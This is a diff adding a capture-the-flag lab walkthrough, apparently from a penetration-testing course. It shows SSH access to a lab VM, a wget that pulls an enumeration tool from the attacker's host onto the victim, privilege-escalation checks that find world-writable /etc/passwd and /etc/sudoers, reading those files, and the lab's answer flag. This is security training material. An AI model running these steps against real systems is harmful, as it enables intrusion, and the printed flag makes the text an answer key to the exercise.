@@ -1,0 +1,26 @@
+Questions 
+Connect to VM 1 with the provided credentials and run unix-privesc-check in standard mode. The flag is inside a file that normally should not be world-writable.
+
+HINT
+Run the 'unix-privesc-check' tool in standard mode to find world-writable files on a Unix system.
+Once you find a world-writable file, read the file with the ""cat"" command in order to find the flag.
+
+ssh joe@192.168.178.214 -p22
+
+# Prepare the automated enumeration tools
+# To get an initial baseline of the target system, we can use unix-privesc-check tools on UNIX derivatives.
+# Defaultly, bash script is installed on local Kali machine at /usr/bin/unix-privesc-check
+
+# Lets transfer the bash file to victim machine
+wget http://192.168.45.207/unix-privesc-check
+chmod 755 unix-privesc-check 
+./unix-privesc-check standard > output.txt
+...
+WARNING: /etc/passwd is a critical config file. World write is set for /etc/passwd
+WARNING: /etc/sudoers is a critical config file. World write is set for /etc/sudoers
+...
+cat /etc/passwd
+cat /etc/sudoers
+...
+#OS{91e0b985c38d459eca85811f56f774a3}
+...
